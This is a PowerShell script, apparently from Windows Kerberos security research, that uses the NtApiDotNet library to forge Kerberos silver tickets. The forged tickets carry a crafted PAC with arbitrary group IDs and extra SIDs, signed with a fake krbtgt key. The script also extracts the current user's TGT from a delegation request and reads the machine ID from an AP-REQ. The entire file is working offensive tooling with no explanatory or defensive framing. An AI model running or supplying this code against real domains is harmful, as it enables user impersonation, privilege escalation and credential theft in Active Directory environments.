function New-KerberosSilverTicket {
    param(
        [Parameter(Mandatory)]
        [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosAuthenticationKey]$Key,
        [Parameter(Mandatory)]
        [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosPrincipalName]$ServerName,
        [Parameter(Mandatory)]
        [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosPrincipalName]$ClientName,
        [Parameter(Mandatory)]
        [string]$Realm,
        [Parameter(Mandatory)]
        [NtApiDotNet.Sid]$UserSid,
        [uint32[]]$GroupId,
        [NtApiDotNet.Sid[]]$ExtraSid,
        [switch]$Limited,
        [switch]$Format
    )

    $Realm = $Realm.ToUpper()
    $auth_time = [datetime]::UtcNow.AddDays(-1)
    $kerb_auth_time = [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosTime]::new($auth_time)
    if ($ClientName.NameType -ne "PRINCIPAL") {
        throw "Client name should be a principal."
    }
    $user_name = $ClientName.Names[0]
    $pac = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACBuilder]::new()
    $logon = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACLogonBuilder]::new($UserSid.Parent)
    $logon.UserAccountControl = "NormalAccount"
    $logon.LogonTime = $auth_time
    $logon.PasswordLastSet = [datetime]::UtcNow
    $logon.PasswordCanChange = [datetime]::UtcNow
    $logon.LogonServer = "PRIMARYDC"
    $logon.LogonDomainName = $Realm.Split('.')[0]
    $logon.UserSessionKey = New-Object byte[] 16
    $logon.UserId = $UserSid.SubAuthorities[-1]
    $logon.PrimaryGroupId = 513
    $logon.EffectiveName = $user_name
    $logon.FullName = $user_name
    $logon.AddGroupId(513, "Mandatory, Enabled, EnabledByDefault")
    foreach ($rid in $GroupId)
    {
        $logon.AddGroupId($rid, "Mandatory, Enabled, EnabledByDefault")
    }
    foreach ($sid in $ExtraSid) {
        $attr = "Mandatory, Enabled, EnabledByDefault"
        if (Test-NtSid $sid -Integrity) {
            $attr = "Integrity, IntegrityEnabled"
        }
        $logon.AddExtraSid($sid, $attr)
        $logon.UserFlags = $logon.UserFlags -bor "ExtraSidsPresent"
    }
    $pac.Entries.Add($logon)
    $pac.Entries.Add([NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACSignatureBuilder]::CreateServerChecksum())
    $pac.Entries.Add([NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACSignatureBuilder]::CreateKDCChecksum())

    $upn = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACUpnDnsInfoBuilder]::new()
    $upn.DnsDomainName = $Realm
    $upn.UserPrincipalName = $user_name
    $upn.Flags = "Extended"
    $upn.SamName = $user_name
    $upn.Sid = $UserSid
    $pac.Entries.Add($upn)

    $client_info = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataPACClientInfoBuilder]::new()
    $client_info.ClientId = $kerb_auth_time.ToDateTime().ToFileTimeUtc()
    $client_info.Name = $user_name
    $pac.Entries.Add($client_info)

    $fake_krbtgt_key = New-KerberosKey -KeyType AES256_CTS_HMAC_SHA1_96
    $pac.ComputeSignatures($Key, $fake_krbtgt_key)

    $if_rel = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosAuthorizationDataIfRelevantBuilder]::new()
    $if_rel.Entries.Add($pac)

    $auth_data = [System.Collections.Generic.List[NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosAuthorizationData]]::new()
    $auth_data.Add($if_rel.Create())

    if ($Limited) {
        $re_ad = [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosAuthorizationDataRestrictionEntry]::new("LimitedToken", "Medium", (Get-MachineId))
        $if_ad = [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosAuthorizationDataIfRelevant]::new(
                [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosAuthorizationDataRestrictionEntry[]]@($re_ad)
            )
        $auth_data.Add($if_ad);
    }

    $ticket_key = New-KerberosKey -KeyType AES256_CTS_HMAC_SHA1_96
    $ticket_builder = [NtApiDotNet.Win32.Security.Authentication.Kerberos.Builder.KerberosTicketBuilder]::new(5, $Realm, $ServerName, 0, $Realm, $ClientName,
                $kerb_auth_time, [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosTime]::Now, 
                [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosTime]::MaximumTime, 
                [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosTime]::MaximumTime, 
                $ticket_key, [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosTransitedEncoding]::new(),
                $null, $auth_data)
    $ticket_dec = $ticket_builder.Create()
    if ($Format) {
        Format-KerberosTicket $ticket_dec | Out-Host
    }
    $ticket = $ticket_dec.Encrypt($Key)
    [NtApiDotNet.Win32.Security.Authentication.Kerberos.KerberosCredential]::Create($ticket, $ticket_dec.ToCredentialInfo())
}

function Get-UserTgt {
    param(
        [string]$Target
    )

    if ("" -eq $Target) {
        $Target = "CIFS/$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)"
    }
    Use-NtObject($creds = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Outbound) {
        Use-NtObject($client = New-LsaClientContext -CredHandle $creds -Target $Target -RequestAttribute MutualAuth,Delegate) {
            $ticket = Get-KerberosTicket -TargetName $Target -CacheOnly
            $ap_req = Unprotect-LsaAuthToken -Token $client.Token -Key $ticket.SessionKey
            $ret = $ap_req.Authenticator.Checksum.Credentials
            if ($null -eq $ret) {
                throw "Couldn't get delegation TGT"
            }
            $ret
        }       
    }
}

function Get-MachineId {
    $target = "HOST/$env:COMPUTERNAME"
    Use-NtObject($creds = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Outbound) {
        Use-NtObject($client = New-LsaClientContext -CredHandle $creds -Target $target) {
            $ticket = Get-KerberosTicket -TargetName $target -CacheOnly
            $ap_req = Unprotect-LsaAuthToken -Token $client.Token -Key $ticket.SessionKey
            $ret = $ap_req.Authenticator.FindFirstAuthorizationData("KERB_AD_RESTRICTION_ENTRY")
            if ($null -eq $ret) {
                throw "Couldn't get machine ID"
            }
            $ret.MachineId
        }       
    }
}